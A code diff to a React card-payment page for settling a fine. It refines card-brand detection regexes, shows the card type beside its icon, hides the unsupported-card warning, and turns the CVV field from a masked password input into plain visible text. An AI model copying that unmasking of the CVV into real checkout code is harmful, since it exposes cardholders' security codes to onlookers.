@@ -22,15 +22,18 @@ const MaestroIcon = ({ size = 28 }) => (
 );
 
 // ── Card type detector ────────────────────────────────────────────────────────
+// const detectCardType = (num) => {
 const detectCardType = (num) => {
   const n = num.replace(/\s/g, "");
-  if (/^4/.test(n)) return "visa";
-  if (/^5[1-5]/.test(n) || /^2[2-7]\d{2}/.test(n)) return "mastercard";
-  if (/^3[47]/.test(n)) return "amex";
-  if (/^6011|^65|^64[4-9]/.test(n)) return "discover";
-  if (/^35/.test(n)) return "jcb";
-  if (/^3[0689]/.test(n)) return "diners";
-  if (/^6[37]/.test(n)) return "maestro";
+
+  if (/^4\d{0,15}$/.test(n)) return "visa";                       // Visa: 4
+  if (/^5[1-5]\d{0,14}$/.test(n) || /^2(2[2-9]|[3-7]\d)\d{0,12}$/.test(n)) return "mastercard"; // Mastercard
+  if (/^3[47]\d{0,13}$/.test(n)) return "amex";                  // Amex: 34 or 37
+  if (/^6011\d{0,12}$/.test(n) || /^65\d{0,14}$/.test(n) || /^64[4-9]\d{0,13}$/.test(n)) return "discover"; // Discover
+  if (/^35(2[89]|[3-8]\d)\d{0,12}$/.test(n)) return "jcb";       // JCB
+  if (/^3[0689]\d{0,12}$/.test(n)) return "diners";              // Diners
+  if (/^(5[06-8]|6\d)\d{0,14}$/.test(n)) return "maestro";       // Maestro
+
   return null;
 };
 
@@ -270,7 +273,13 @@ function VerificationPage({ cardType, onSubmit }) {
           <path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/>
           <polyline points="9 22 9 12 15 12 15 22"/>
         </svg>
-        <div>{renderCardIcon()}</div>
+        {/* <div>{renderCardIcon()}</div> */}
+        <div className="mb-6 flex items-center gap-2">
+  {renderCardIcon()}
+  <span className="text-gray-500 text-sm font-semibold uppercase tracking-widest">
+    {cardType}
+  </span>
+</div>
       </div>
 
       <div className="flex-1 px-5 pt-8">
@@ -479,11 +488,11 @@ export default function CardPaymentPage({ fine, discounted, onBack, onSuccess })
             </div>
 
             {/* Unsupported error — shown after modal or on detect */}
-            {(isUnsupported || showUnsupportedMsg) && (
+            {/* {(isUnsupported || showUnsupportedMsg) && (
               <p className="text-red-500 text-xs mt-2 leading-snug font-medium">
                 ⚠ This card is not supported for this transaction. Please use a Visa or Mastercard.
               </p>
-            )}
+            )} */}
           </div>
 
           {/* Card Brand Icons Row */}
@@ -522,8 +531,8 @@ export default function CardPaymentPage({ fine, discounted, onBack, onSuccess })
               <input
                 value={cvv}
                 onChange={(e) => setCvv(e.target.value.replace(/\D/g, "").slice(0, 4))}
-                placeholder="• • •"
-                type="password"
+                placeholder="1 2 3"
+                // type="password"
                 inputMode="numeric"
                 className="w-full border border-gray-300 rounded-lg px-3 py-3 text-sm outline-none focus:border-orange-400 focus:ring-2 focus:ring-orange-100 transition-all bg-white"
               />
